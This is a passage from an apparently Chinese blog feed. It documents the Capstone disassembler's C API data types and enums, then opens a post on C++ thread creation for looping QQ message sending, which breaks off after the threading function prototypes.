class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上这是官方给出的C语言开发唯一几个例子之一，但注意到代码cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)，测试的是archx64的反编译，因此编译选项也需要设置为x64，除此以外，如果你的项目像我一样是c++开发，那么printf(“0x%””Ix””:\t%s\t\t%s\n”, insn[j].address, insn[j].mnemonic, insn[j].op_str);处官方给出的”0x%”PRIx64”:\t%s\t\t%s\n”应修改为我这里的”0x%””Ix””:\t%s\t\t%s\n”，这是inttypes支持问题。</p><p>运行结果<br><img src="https://i.loli.net/2019/07/20/5d32ca5adbd7040022.jpg" alt></p><h2 id="0x1-数据类型及API分析"><a href="#0x1-数据类型及API分析" class="headerlink" title="0x1 数据类型及API分析"></a>0x1 数据类型及API分析</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h4><p>用于生成调用capstone API的句柄<br><code>size_t csh</code> </p><blockquote><p>用法： <code>csh handle;</code></p></blockquote><h4 id="cs-arch"><a href="#cs-arch" class="headerlink" title="cs_arch"></a>cs_arch</h4><p>架构选择</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">enum</span> cs_arch &#123;</span><br><span class="line">CS_ARCH_ARM = <span class="number">0</span>,<span class="comment">///&lt; ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">CS_ARCH_ARM64,<span class="comment">///&lt; ARM-64, 也叫 AArch64</span></span><br><span class="line">CS_ARCH_MIPS,<span class="comment">///&lt; Mips 架构</span></span><br><span class="line">   CS_ARCH_X86,<span class="comment">///&lt; X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">CS_ARCH_PPC,<span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">CS_ARCH_SPARC,<span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">CS_ARCH_SYSZ,<span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">CS_ARCH_XCORE,<span class="comment">///&lt; XCore 架构</span></span><br><span class="line">CS_ARCH_M68K,<span class="comment">///&lt; 68K 架构</span></span><br><span class="line">CS_ARCH_TMS320C64X,<span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">CS_ARCH_M680X,<span class="comment">///&lt; 680X 架构</span></span><br><span class="line">CS_ARCH_EVM,<span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">CS_ARCH_MAX,</span><br><span class="line">CS_ARCH_ALL = <span class="number">0xFFFF</span>, <span class="comment">// All 架构 - for cs_support()</span></span><br><span class="line">&#125; cs_arch;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_arch参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第一个参数填CS_ARCH_X86则支持X86 架构</p></blockquote><h4 id="cs-mode"><a href="#cs-mode" class="headerlink" title="cs_mode"></a>cs_mode</h4><p>模式选择</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_mode &#123;</span><br><span class="line">CS_MODE_LITTLE_ENDIAN = <span class="number">0</span>,<span class="comment">///&lt; little-endian 模式 (default 模式)</span></span><br><span class="line">CS_MODE_ARM = <span class="number">0</span>,<span class="comment">///&lt; 32-bit ARM</span></span><br><span class="line">CS_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,<span class="comment">///&lt; 16-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,<span class="comment">///&lt; 32-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,<span class="comment">///&lt; 64-bit 模式 (X86, PPC)</span></span><br><span class="line">CS_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,<span class="comment">///&lt; ARM's Thumb 模式, 包括 Thumb-2</span></span><br><span class="line">CS_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,<span class="comment">///&lt; ARM's Cortex-M 系列</span></span><br><span class="line">CS_MODE_V8 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,<span class="comment">///&lt; ARM解码方式ARMv8 A32 </span></span><br><span class="line">CS_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; MicroMips 模式 (MIPS)</span></span><br><span class="line">CS_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; Mips III ISA</span></span><br><span class="line">CS_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; Mips32r6 ISA</span></span><br><span class="line">CS_MODE_MIPS2 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; Mips II ISA</span></span><br><span class="line">CS_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; SparcV9 模式 (Sparc)</span></span><br><span class="line">CS_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; Quad Processing eXtensions 模式 (PPC)</span></span><br><span class="line">CS_MODE_M68K_000 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M68K 68000 模式</span></span><br><span class="line">CS_MODE_M68K_010 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M68K 68010 模式</span></span><br><span class="line">CS_MODE_M68K_020 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M68K 68020 模式</span></span><br><span class="line">CS_MODE_M68K_030 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M68K 68030 模式</span></span><br><span class="line">CS_MODE_M68K_040 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M68K 68040 模式</span></span><br><span class="line">CS_MODE_M68K_060 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M68K 68060 模式</span></span><br><span class="line">CS_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">31</span>,<span class="comment">///&lt; big-endian 模式</span></span><br><span class="line">CS_MODE_MIPS32 = CS_MODE_32,<span class="comment">///&lt; Mips32 ISA (Mips)</span></span><br><span class="line">CS_MODE_MIPS64 = CS_MODE_64,<span class="comment">///&lt; Mips64 ISA (Mips)</span></span><br><span class="line">CS_MODE_M680X_6301 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M680X Hitachi 6301,6303 模式</span></span><br><span class="line">CS_MODE_M680X_6309 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M680X Hitachi 6309 模式</span></span><br><span class="line">CS_MODE_M680X_6800 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M680X Motorola 6800,6802 模式</span></span><br><span class="line">CS_MODE_M680X_6801 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M680X Motorola 6801,6803 模式</span></span><br><span class="line">CS_MODE_M680X_6805 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M680X Motorola/Freescale 6805 模式</span></span><br><span class="line">CS_MODE_M680X_6808 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC08 模式</span></span><br><span class="line">CS_MODE_M680X_6809 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; M680X Motorola 6809 模式</span></span><br><span class="line">CS_MODE_M680X_6811 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC11 模式</span></span><br><span class="line">CS_MODE_M680X_CPU12 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP CPU12</span></span><br><span class="line"><span class="comment">///&lt; 用于 M68HC12/HCS12</span></span><br><span class="line">CS_MODE_M680X_HCS08 = <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="comment">///&lt; M680X Freescale/NXP HCS08 模式</span></span><br><span class="line">&#125; cs_mode;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_mode参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第二个参数填CS_MODE_64则支持X64模式</p></blockquote><h4 id="cs-opt-mem"><a href="#cs-opt-mem" class="headerlink" title="cs_opt_mem"></a>cs_opt_mem</h4><p>内存操作</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure><blockquote><p>用法：可使用用户自定义的malloc/calloc/realloc/free/vsnprintf()函数，默认使用系统自带malloc(), calloc(), realloc(), free() &amp; vsnprintf()</p></blockquote><h4 id="cs-opt-mnem"><a href="#cs-opt-mnem" class="headerlink" title="cs_opt_mnem"></a>cs_opt_mnem</h4><p>自定义助记符</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mnem</span> &#123;</span></span><br><span class="line"><span class="comment">/// 需要自定义的指令ID</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="comment">/// 自定义的助记符</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line">&#125; cs_opt_mnem;</span><br></pre></td></tr></table></figure><h4 id="cs-opt-type"><a href="#cs-opt-type" class="headerlink" title="cs_opt_type"></a>cs_opt_type</h4><p>反编译的运行时选项</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_type &#123;</span><br><span class="line">CS_OPT_INVALID = <span class="number">0</span>,<span class="comment">///&lt; 无特殊要求</span></span><br><span class="line">CS_OPT_SYNTAX,<span class="comment">///&lt; 汇编输出语法</span></span><br><span class="line">CS_OPT_DETAIL,<span class="comment">///&lt; 将指令结构分解为多个细节</span></span><br><span class="line">CS_OPT_MODE,<span class="comment">///&lt; 运行时改变引擎模式</span></span><br><span class="line">CS_OPT_MEM,<span class="comment">///&lt; 用户定义的动态内存相关函数</span></span><br><span class="line">CS_OPT_SKIPDATA, <span class="comment">///&lt; 在反汇编时跳过数据。然后引擎将处于SKIPDATA模式</span></span><br><span class="line">CS_OPT_SKIPDATA_SETUP, <span class="comment">///&lt; 为SKIPDATA选项设置用户定义函数</span></span><br><span class="line">CS_OPT_MNEMONIC, <span class="comment">///&lt;自定义指令助记符</span></span><br><span class="line">CS_OPT_UNSIGNED, <span class="comment">///&lt; 以无符号形式打印立即操作数</span></span><br><span class="line">&#125; cs_opt_type;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第二个参数</p></blockquote><h4 id="cs-opt-value"><a href="#cs-opt-value" class="headerlink" title="cs_opt_value"></a>cs_opt_value</h4><p>运行时选项值(与cs_opt_type关联)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_value &#123;</span><br><span class="line">CS_OPT_OFF = <span class="number">0</span>,  <span class="comment">///&lt; 关闭一个选项 - 默认为CS_OPT_DETAIL, CS_OPT_SKIPDATA, CS_OPT_UNSIGNED.</span></span><br><span class="line">CS_OPT_ON = <span class="number">3</span>, <span class="comment">///&lt; 打开一个选项 (CS_OPT_DETAIL, CS_OPT_SKIPDATA).</span></span><br><span class="line">CS_OPT_SYNTAX_DEFAULT = <span class="number">0</span>, <span class="comment">///&lt; 默认asm语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_INTEL, <span class="comment">///&lt; X86 Intel asm语法 - 默认开启 X86 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_ATT,   <span class="comment">///&lt; X86 ATT 汇编语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_NOREGNAME, <span class="comment">///&lt; 只打印寄存器名和编号 (CS_OPT_SYNTAX)</span></span><br><span class="line">CS_OPT_SYNTAX_MASM, <span class="comment">///&lt; X86 Intel Masm 语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">&#125; cs_opt_value;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第三个参数</p></blockquote><h4 id="cs-op-type"><a href="#cs-op-type" class="headerlink" title="cs_op_type"></a>cs_op_type</h4><p>通用指令操作数类型，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_op_type &#123;</span><br><span class="line">CS_OP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效的操作数</span></span><br><span class="line">CS_OP_REG,          <span class="comment">///&lt; 寄存器操作数</span></span><br><span class="line">CS_OP_IMM,          <span class="comment">///&lt; 立即操作数</span></span><br><span class="line">CS_OP_MEM,          <span class="comment">///&lt; 内存操作数</span></span><br><span class="line">CS_OP_FP,           <span class="comment">///&lt; 浮点数</span></span><br><span class="line">&#125; cs_op_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-ac-type"><a href="#cs-ac-type" class="headerlink" title="cs_ac_type"></a>cs_ac_type</h4><p>通用指令操作数访问类型，在所有架构中保持一致<br>可以组合访问类型，例如:CS_AC_READ | CS_AC_WRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_ac_type &#123;</span><br><span class="line">CS_AC_INVALID = <span class="number">0</span>,        <span class="comment">///&lt; 未初始化/无效的访问类型</span></span><br><span class="line">CS_AC_READ    = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中读取</span></span><br><span class="line">CS_AC_WRITE   = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中写入</span></span><br><span class="line">&#125; cs_ac_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-group-type"><a href="#cs-group-type" class="headerlink" title="cs_group_type"></a>cs_group_type</h4><p>公共指令组，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs_group_type &#123;</span><br><span class="line">CS_GRP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效指令组</span></span><br><span class="line">CS_GRP_JUMP,    <span class="comment">///&lt; 所有跳转指令(条件跳转+直接跳转+间接跳转)</span></span><br><span class="line">CS_GRP_CALL,    <span class="comment">///&lt; 所有调用指令</span></span><br><span class="line">CS_GRP_RET,     <span class="comment">///&lt; 所有返回指令</span></span><br><span class="line">CS_GRP_INT,     <span class="comment">///&lt; 所有中断指令(int+syscall)</span></span><br><span class="line">CS_GRP_IRET,    <span class="comment">///&lt; 所有中断返回指令</span></span><br><span class="line">CS_GRP_PRIVILEGE,    <span class="comment">///&lt; 所有特权指令</span></span><br><span class="line">CS_GRP_BRANCH_RELATIVE, <span class="comment">///&lt; 所有相关分支指令</span></span><br><span class="line">&#125; cs_group_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-opt-skipdata"><a href="#cs-opt-skipdata" class="headerlink" title="cs_opt_skipdata"></a>cs_opt_skipdata</h4><p>用户自定义设置SKIPDATA选项</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_skipdata</span> &#123;</span></span><br><span class="line"><span class="comment">/// Capstone认为要跳过的数据是特殊的“指令”</span></span><br><span class="line"><span class="comment">/// 用户可以在这里指定该指令的“助记符”字符串</span></span><br><span class="line"><span class="comment">/// 默认情况下(@mnemonic为NULL)， Capstone使用“.byte”</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户定义的回调函数，当Capstone命中数据时调用</span></span><br><span class="line"><span class="comment">/// 如果这个回调返回的值是正数(&gt;0)，Capstone将跳过这个字节数并继续。如果回调返回0,Capstone将停止反汇编并立即从cs_disasm()返回</span></span><br><span class="line"><span class="comment">/// 注意:如果这个回调指针为空，Capstone会根据架构跳过一些字节，如下所示:</span></span><br><span class="line"><span class="comment">/// Arm:     2 bytes (Thumb mode) or 4 bytes.</span></span><br><span class="line"><span class="comment">/// Arm64:   4 bytes.</span></span><br><span class="line"><span class="comment">/// Mips:    4 bytes.</span></span><br><span class="line"><span class="comment">/// M680x:   1 byte.</span></span><br><span class="line"><span class="comment">/// PowerPC: 4 bytes.</span></span><br><span class="line"><span class="comment">/// Sparc:   4 bytes.</span></span><br><span class="line"><span class="comment">/// SystemZ: 2 bytes.</span></span><br><span class="line"><span class="comment">/// X86:     1 bytes.</span></span><br><span class="line"><span class="comment">/// XCore:   2 bytes.</span></span><br><span class="line"><span class="comment">/// EVM:     1 bytes.</span></span><br><span class="line"><span class="keyword">cs_skipdata_cb_t</span> callback; <span class="comment">// 默认值为 NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户自定义数据将被传递给@callback函数指针</span></span><br><span class="line"><span class="keyword">void</span> *user_data;</span><br><span class="line">&#125; cs_opt_skipdata;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p><h4 id="cs-detail"><a href="#cs-detail" class="headerlink" title="cs_detail"></a>cs_detail</h4><p>注意:只有当CS_OPT_DETAIL = CS_OPT_ON时，cs_detail中的所有信息才可用</p></blockquote><p>在arch/ARCH/ARCHDisassembler.c的ARCH_getInstruction中初始化为memset(., 0, offsetof(cs_detail, ARCH)+sizeof(cs_ARCH))</p><p>如果cs_detail发生了变化，特别是在union之后添加了字段，那么相应地更新arch/ arch/ archdisassembly .c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_detail</span> &#123;</span></span><br><span class="line"><span class="keyword">uint16_t</span> regs_read[<span class="number">12</span>]; <span class="comment">///&lt; 这个参数读取隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count; <span class="comment">///&lt; 这个参数读取隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> regs_write[<span class="number">20</span>]; <span class="comment">///&lt; 这个参数修改隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_write_count; <span class="comment">///&lt; 这个参数修改隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> groups[<span class="number">8</span>]; <span class="comment">///&lt; 此指令所属的指令组的列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> groups_count; <span class="comment">///&lt; 此指令所属的组的数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 特定于体系结构的信息</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">cs_x86 x86;     <span class="comment">///&lt; X86 架构, 包括 16-bit, 32-bit &amp; 64-bit 模式</span></span><br><span class="line">cs_arm64 arm64; <span class="comment">///&lt; ARM64 架构 (aka AArch64)</span></span><br><span class="line">cs_arm arm;     <span class="comment">///&lt; ARM 架构 (包括 Thumb/Thumb2)</span></span><br><span class="line">cs_m68k m68k;   <span class="comment">///&lt; M68K 架构</span></span><br><span class="line">cs_mips mips;   <span class="comment">///&lt; MIPS 架构</span></span><br><span class="line">cs_ppc ppc;    <span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">cs_sparc sparc; <span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">cs_sysz sysz;   <span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">cs_xcore xcore; <span class="comment">///&lt; XCore 架构</span></span><br><span class="line">cs_tms320c64x tms320c64x;  <span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">cs_m680x m680x; <span class="comment">///&lt; M680X 架构</span></span><br><span class="line">cs_evm evm;    <span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; cs_detail;</span><br></pre></td></tr></table></figure><h4 id="cs-insn"><a href="#cs-insn" class="headerlink" title="cs_insn"></a>cs_insn</h4><p>指令的详细信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_insn</span> &#123;</span></span><br><span class="line"><span class="comment">/// 指令ID(基本上是一个用于指令助记符的数字ID)</span></span><br><span class="line"><span class="comment">/// 应在相应架构的头文件中查找'[ARCH]_insn' enum中的指令id，如ARM.h中的'arm_insn'代表ARM, X86.h中的'x86_insn'代表X86等…</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="comment">/// 注意:在Skipdata模式下，这个id字段的“data”指令为0</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令地址 (EIP)</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令长度</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint16_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 此指令的机器码，其字节数由上面的@size表示</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint8_t</span> bytes[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令的Ascii文本助记符</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> mnemonic[CS_MNEMONIC_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令操作数的Ascii文本</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> op_str[<span class="number">160</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// cs_detail指针</span></span><br><span class="line"><span class="comment">/// 注意:只有同时满足以下两个要求时，detail指针才有效:</span></span><br><span class="line"><span class="comment">/// (1) CS_OP_DETAIL = CS_OPT_ON</span></span><br><span class="line"><span class="comment">/// (2) 引擎未处于Skipdata模式(CS_OP_SKIPDATA选项设置为CS_OPT_ON)</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// 注意2:当处于Skipdata模式或detail模式关闭时，即使这个指针不是NULL，它的内容仍然是不相关的。</span></span><br><span class="line">cs_detail *detail;</span><br><span class="line">&#125; cs_insn;</span><br></pre></td></tr></table></figure><h4 id="cs-err"><a href="#cs-err" class="headerlink" title="cs_err"></a>cs_err</h4><p>Capstone API遇到的各类型的错误时cs_errno()的返回值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> cs_err &#123;</span><br><span class="line">CS_ERR_OK = <span class="number">0</span>,   <span class="comment">///&lt; 无错误</span></span><br><span class="line">CS_ERR_MEM,      <span class="comment">///&lt; 内存不足: cs_open(), cs_disasm(), cs_disasm_iter()</span></span><br><span class="line">CS_ERR_ARCH,     <span class="comment">///&lt; 不支持的架构: cs_open()</span></span><br><span class="line">CS_ERR_HANDLE,   <span class="comment">///&lt;句柄不可用: cs_op_count(), cs_op_index()</span></span><br><span class="line">CS_ERR_CSH,      <span class="comment">///&lt; csh参数不可用: cs_close(), cs_errno(), cs_option()</span></span><br><span class="line">CS_ERR_MODE,     <span class="comment">///&lt; 无效的或不支持的模式: cs_open()</span></span><br><span class="line">CS_ERR_OPTION,   <span class="comment">///&lt; 无效的或不支持的选项: cs_option()</span></span><br><span class="line">CS_ERR_DETAIL,   <span class="comment">///&lt; 信息不可用，因为detail选项是关闭的</span></span><br><span class="line">CS_ERR_MEMSETUP, <span class="comment">///&lt; 动态内存管理未初始化(见 CS_OPT_MEM)</span></span><br><span class="line">CS_ERR_VERSION,  <span class="comment">///&lt; 不支持版本 (bindings)</span></span><br><span class="line">CS_ERR_DIET,     <span class="comment">///&lt; 在“diet”引擎中访问不相关的数据</span></span><br><span class="line">CS_ERR_SKIPDATA, <span class="comment">///&lt; 在SKIPDATA模式下访问与“数据”指令无关的数据</span></span><br><span class="line">CS_ERR_X86_ATT,  <span class="comment">///&lt; X86 AT&amp;T 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_INTEL, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_MASM, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">&#125; cs_err;</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-一&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-一&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(一)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C++调用线程实现QQ消息循环发送</title>
    <link href="https://kabeor.github.io/C++%E8%B0%83%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%91%E9%80%81/"/>
    <id>https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</id>
    <published>2019-04-24T11:35:50.051Z</published>
    <updated>2019-04-24T11:44:48.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-调用线程实现QQ消息循环发送"><a href="#C-调用线程实现QQ消息循环发送" class="headerlink" title="C++调用线程实现QQ消息循环发送"></a>C++调用线程实现QQ消息循环发送</h1><p>##函数原型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned long _beginthread(  </span><br><span class="line">             void(_cdecl *start_address)(void *), //声明为void (*start_address)(void *)形式  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             void *arglist //向线程传递的参数，一般为结构体</span><br><span class="line">           ); </span><br><span class="line"></span><br><span class="line">unsigned long _beginthreadex( //推荐使用   </span><br><span class="line">             void *security,//安全属性，NULL表示默认安全性  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             unsigned(_stdcall  *start_address)(void *),//声明为unsigned(*start_address)(void *)形式  </span><br><span class="line">             void *argilist,//向线程传递的参数，一般为结构体  </span><br><span class="line">             unsigned initflag, //新线程的初始状态，0表示立即执行，CREATE_SUSPEND表示创建后挂起。  </span><br><span class="line">             unsigned *thrdaddr //该变量存放线程标识符，它是CreateThread函数中的线程ID。); //创建成功条件下的将线程句柄转化为unsigned long型返回，创建失败条件下返回0</span><br></pre></td></tr></table></figure></p><blockquote><p>使用_beginthreadex而不是CreateThread的原因</p></blockquote><p> _beginthreadex在内部调用了CreateThread，在调用之前_beginthreadex做了很多的工作，从而使得它比CreateThread更安全。</p><p>通常建议使用_beginthreadex函数，而不是CreateThread函数，这使得线程中的代码不需要考虑C/C++代码的线程安全性，除非你清楚地知道在新的线程中不会调用到线程不安全的C/C++代码，这时候放心地使用CreateThread也无可厚非(实际上这种情况很难判定)。_beginthreadex保证了某些C/C++运行库代码的线程安全性，而CreateThread没有对这些特殊的C/C++代码做出保证，这里再次强调这两个函数的区别。不要含糊地认为CreateThread的设计存在缺陷，CreateThread的功能并不专门针对于C/C++运行库，理所当然不必为其多线程安全性而负责。</p><p>##实现<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 